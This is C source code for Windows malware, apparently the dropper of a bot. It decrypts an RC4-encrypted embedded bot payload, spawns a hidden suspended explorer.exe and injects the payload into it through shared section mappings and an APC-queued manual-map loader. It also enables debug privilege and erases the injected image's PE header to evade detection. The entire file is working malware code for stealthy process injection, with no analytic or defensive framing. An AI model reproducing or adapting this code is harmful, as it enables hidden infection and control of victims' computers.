#include <Windows.h>

#include "..\common\api.h"
#include "..\common\mem.h"
#include "..\common\utils.h"
#include "..\common\crypto.h"

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE,LPCSTR);

typedef BOOL (WINAPI *PDLL_MAIN)(HMODULE,DWORD,PVOID);

bot_t bot;

typedef struct
{
	PVOID ImageBase;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseRelocation;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;
	DWORD dwSizeOfImage;
	DWORD dwSizeOfKey;
	LPBYTE lpKey;

	bot_t remoteBot;
}MANUAL_INJECT;

#include "shellcode_x86.h"

DWORD WINAPI LoadDll(PVOID p)
{
	MANUAL_INJECT* ManualInject;

	HMODULE hModule;
	DWORD i,Function,count,delta;

	PDWORD ptr;
	PWORD list;

	PIMAGE_BASE_RELOCATION pIBR;
	PIMAGE_IMPORT_DESCRIPTOR pIID;
	PIMAGE_IMPORT_BY_NAME pIBN;
	PIMAGE_THUNK_DATA FirstThunk,OrigFirstThunk;

	PDLL_MAIN EntryPoint;

	BYTE* pKey;
	DWORD dwKeyLen;
	BYTE* pBuffer; 
	DWORD dwBufferLen;
	BYTE swap = 0;
	int a = 0;
	int RC4_s[256];
	int b = 0;
	int c = 0;
	DWORD dwCount;
	DWORD trash = 0;
	LPBYTE MZPatch;
	DWORD MZCounter;

	ManualInject=(MANUAL_INJECT*)p;
	
	pBuffer = ManualInject->ImageBase;
	pKey = ManualInject->lpKey;
	dwKeyLen = ManualInject->dwSizeOfKey;
	dwBufferLen = ManualInject->dwSizeOfImage;

	for( a = 0; a < 256; a++ )
		RC4_s[a] = a;

	for( a = 0; a < 256; a++ )
	{
		c = RC4_s[a] + pKey[a % dwKeyLen];
		b = ( b + c ) % 256;
		swap = RC4_s[a];
		RC4_s[a] = RC4_s[b];
		RC4_s[b] = swap;
	}

	for( dwCount = 0; dwCount < dwBufferLen; dwCount++ )
	{
		a = ( a + 1 ) % 256;
		b = ( b + RC4_s[a] ) % 256;
		swap = RC4_s[a];
		RC4_s[a] = RC4_s[b];
		RC4_s[b] = swap;
		pBuffer[dwCount] ^= RC4_s[( RC4_s[a] + RC4_s[b]) % 256];
	}

	
	pIBR=ManualInject->BaseRelocation;
	delta=(DWORD)((LPBYTE)ManualInject->ImageBase-ManualInject->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

	// Relocate the image

	while(pIBR->VirtualAddress)
	{
		if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
		{
			count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
			list=(PWORD)(pIBR+1);

			for(i=0;i<count;i++)
			{
				if(list[i])
				{
					ptr=(PDWORD)((LPBYTE)ManualInject->ImageBase+(pIBR->VirtualAddress+(list[i] & 0xFFF)));
					*ptr+=delta;
				}
			}
		}

		pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR+pIBR->SizeOfBlock);
	}

	pIID=ManualInject->ImportDirectory;

	// Resolve DLL imports

	while(pIID->Characteristics)
	{
		OrigFirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->OriginalFirstThunk);
		FirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->FirstThunk);

		hModule=ManualInject->fnLoadLibraryA((LPCSTR)ManualInject->ImageBase+pIID->Name);

		if(!hModule)
		{
			return FALSE;
		}

		while(OrigFirstThunk->u1.AddressOfData)
		{
			if(OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal

				Function=(DWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if(!Function)
				{
					return FALSE;
				}

				FirstThunk->u1.Function=Function;
			}

			else
			{
				// Import by name

				pIBN=(PIMAGE_IMPORT_BY_NAME)((LPBYTE)ManualInject->ImageBase+OrigFirstThunk->u1.AddressOfData);
				Function=(DWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)pIBN->Name);

				if(!Function)
				{
					return FALSE;
				}

				FirstThunk->u1.Function=Function;
			}

			OrigFirstThunk++;
			FirstThunk++;
		}

		pIID++;
	}

	if(ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		for(MZPatch = ManualInject->ImageBase, MZCounter = 0; MZCounter < 0xc3; MZCounter++, MZPatch++)
			*MZPatch = 0x00;
		EntryPoint=(PDLL_MAIN)((LPBYTE)ManualInject->ImageBase+ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint);
		return EntryPoint((HMODULE)ManualInject->ImageBase,DLL_PROCESS_ATTACH, &ManualInject->remoteBot); // Call the entry point
	}

	return TRUE;
}

DWORD WINAPI LoadDllEnd()
{
	return 0;
}

static BOOL _InjectPayload(const LPVOID lpPayload, DWORD dwSize)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;
	LARGE_INTEGER SectionMaxSize = {0, 0};
	DWORD ViewSize = 0;
	HANDLE SectionHandle = NULL;
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	LPWSTR pwzExplorerPath;
	LPBYTE lpMappedImage = NULL;
	LPVOID lpImage = NULL, lpParameters = NULL, lpMappedParameters = NULL, lpLoader = NULL, lpMappedLoader = NULL, lpEncryptedImage = NULL, lpRemoteKey = NULL;
	DWORD i, dwLoaderSize;
	BYTE Key[] = {1,2,3,4,5,6,7,8,9,10};

	MANUAL_INJECT ManualInject;

	dwLoaderSize = (DWORD)LoadDllEnd - (DWORD)LoadDll;

	pIDH = (PIMAGE_DOS_HEADER)lpPayload;

	if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE)
		return FALSE;

	pINH=(PIMAGE_NT_HEADERS)((LPBYTE)lpPayload + pIDH->e_lfanew);

	if(pINH->Signature!=IMAGE_NT_SIGNATURE)
		return FALSE;

	if(!(pINH->FileHeader.Characteristics & IMAGE_FILE_DLL))
		return FALSE;

	if((pwzExplorerPath = GetExplorerPath()) == NULL)
		return FALSE;

	memzero(&pi, sizeof(PROCESS_INFORMATION));
	memzero(&si, sizeof(STARTUPINFOW));

	if(CWA(CreateProcessW)(pwzExplorerPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		do 
		{
			memzero(&ManualInject,sizeof(MANUAL_INJECT));

			if(!(lpRemoteKey = CWA(VirtualAllocEx)(pi.hProcess, NULL, 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
				break;
			if(!CWA(WriteProcessMemory)(pi.hProcess, lpRemoteKey, Key, 10, NULL))
				break;

			ManualInject.dwSizeOfKey = 10;
			ManualInject.dwSizeOfImage = pINH->OptionalHeader.SizeOfImage;
			ManualInject.lpKey = lpRemoteKey;

			SectionMaxSize.LowPart = pINH->OptionalHeader.SizeOfImage;	

			lpEncryptedImage = memalloc(pINH->OptionalHeader.SizeOfImage);
			
			memcopy(lpEncryptedImage, lpPayload, pINH->OptionalHeader.SizeOfHeaders);

			for(i=0;i<pINH->FileHeader.NumberOfSections;i++)
			{
				pISH = (PIMAGE_SECTION_HEADER)((DWORD)(lpPayload) + pIDH->e_lfanew + 248 + (i * 40));
				memcopy((PVOID)((LPBYTE)lpEncryptedImage + pISH->VirtualAddress),(PVOID)((LPBYTE)lpPayload+pISH->PointerToRawData),pISH->SizeOfRawData);
			}

			_RC4(Key, pINH->OptionalHeader.SizeOfImage, lpEncryptedImage, 10);

			
			if(CWA(NtCreateSection)(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != NULL)
				break;

			if(CWA(NtMapViewOfSection)(SectionHandle, CWA(GetCurrentProcess)(), (PVOID*)&lpMappedImage, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			if(CWA(NtMapViewOfSection)(SectionHandle, pi.hProcess, &lpImage, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			memcopy(lpMappedImage, lpEncryptedImage, SectionMaxSize.LowPart);

			//lpImage = CWA(VirtualAllocEx)(pi.hProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			//
			//CWA(WriteProcessMemory)(pi.hProcess, lpImage, lpPayload, pINH->OptionalHeader.SizeOfHeaders, NULL);

			//for(i=0;i<pINH->FileHeader.NumberOfSections;i++)
			//{
			//	pISH = (PIMAGE_SECTION_HEADER)((DWORD)(lpPayload) + pIDH->e_lfanew + 248 + (i * 40));
			//	CWA(WriteProcessMemory)(pi.hProcess, (PVOID)((LPBYTE)lpImage + pISH->VirtualAddress),(PVOID)((LPBYTE)lpPayload+pISH->PointerToRawData),pISH->SizeOfRawData, NULL);
			//}


			

			ManualInject.ImageBase = lpImage;
			ManualInject.NtHeaders=(PIMAGE_NT_HEADERS)((LPBYTE)lpImage+pIDH->e_lfanew);
			ManualInject.BaseRelocation=(PIMAGE_BASE_RELOCATION)((LPBYTE)lpImage+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			ManualInject.ImportDirectory=(PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)lpImage+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
			ManualInject.fnLoadLibraryA=LoadLibraryA;
			ManualInject.fnGetProcAddress=GetProcAddress;

			CWA(GetModuleFileNameW)(NULL, ManualInject.remoteBot.wzBotPath, 255);
			ManualInject.remoteBot.iProcessInfectionType = PROCESS_ZOMBIE_INFECTION;

			SectionHandle = NULL;
			SectionMaxSize.LowPart = sizeof(MANUAL_INJECT);
			ViewSize = 0;

			if(CWA(NtCreateSection)(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != NULL)
				break;
			
			if(CWA(NtMapViewOfSection)(SectionHandle, CWA(GetCurrentProcess)(), (PVOID*)&lpMappedParameters, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			if(CWA(NtMapViewOfSection)(SectionHandle, pi.hProcess, (PVOID*)&lpParameters, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			memcopy(lpMappedParameters, &ManualInject, sizeof(MANUAL_INJECT));

			//lpParameters = CWA(VirtualAllocEx)(pi.hProcess, NULL, sizeof(MANUAL_INJECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			//WriteProcessMemory(pi.hProcess, lpParameters, &ManualInject, sizeof(MANUAL_INJECT), NULL);

			SectionHandle = NULL;
			SectionMaxSize.LowPart = dwLoaderSize;
			ViewSize = 0;

			if(CWA(NtCreateSection)(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != NULL)
				break;

			if(CWA(NtMapViewOfSection)(SectionHandle, CWA(GetCurrentProcess)(), (PVOID*)&lpMappedLoader, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			if(CWA(NtMapViewOfSection)(SectionHandle, pi.hProcess, (PVOID*)&lpLoader, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != NULL)
				break;

			memcopy(lpMappedLoader, LoadDll, dwLoaderSize);
		

		/*	lpLoader = CWA(VirtualAllocEx)(pi.hProcess, NULL, dwLoaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

			CWA(WriteProcessMemory)(pi.hProcess, lpLoader, LoadDll, dwLoaderSize, NULL);*/

			/*if(CWA(CreateRemoteThread)(pi.hProcess, 0, 0,(LPTHREAD_START_ROUTINE)lpLoader, lpParameters, NULL, NULL) != 0)
				break;
			
			if(CWA(TerminateThread)(pi.hThread, 0) != 0)
				break;*/

			CWA(QueueUserAPC)((PAPCFUNC)lpLoader, pi.hThread, lpParameters);
		
			CWA(ResumeThread)(pi.hThread);
			
		} 
		while (FALSE);
	}

	CWA(ExitProcess)(0);
	return TRUE;
}

BOOL WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd )
{
	HANDLE hProcess,hThread,hFile,hToken;
	PVOID buffer,image,mem;
	DWORD i,FileSize,ProcessId,ExitCode,read;

	LPVOID lpShellcode;
	BYTE* pShellcodeKey;

	TOKEN_PRIVILEGES tp;
	MANUAL_INJECT ManualInject;

	memzero(&bot, sizeof(bot_t));

	bot.crc.crc32Initialized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	if(OpenProcessToken(CWA(GetCurrentProcess)(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		tp.PrivilegeCount=1;
		tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;

		tp.Privileges[0].Luid.LowPart=20;
		tp.Privileges[0].Luid.HighPart=0;

		AdjustTokenPrivileges(hToken,FALSE,&tp,0,NULL,NULL);
		CloseHandle(hToken);
	}

	if((pShellcodeKey = memalloc(sizeof(key_shellcode_x86))) != NULL)
	{
		memcopy(pShellcodeKey, &key_shellcode_x86, sizeof(key_shellcode_x86));
	}

	if((lpShellcode = memalloc(sizeof(bot_shellcode_x86))) != NULL)
	{
		memcopy(lpShellcode, &bot_shellcode_x86, sizeof(bot_shellcode_x86));

		_RC4(pShellcodeKey, sizeof(bot_shellcode_x86), lpShellcode, sizeof(key_shellcode_x86));
		
		return _InjectPayload(lpShellcode, sizeof(bot_shellcode_x86));
	}

	return FALSE;
}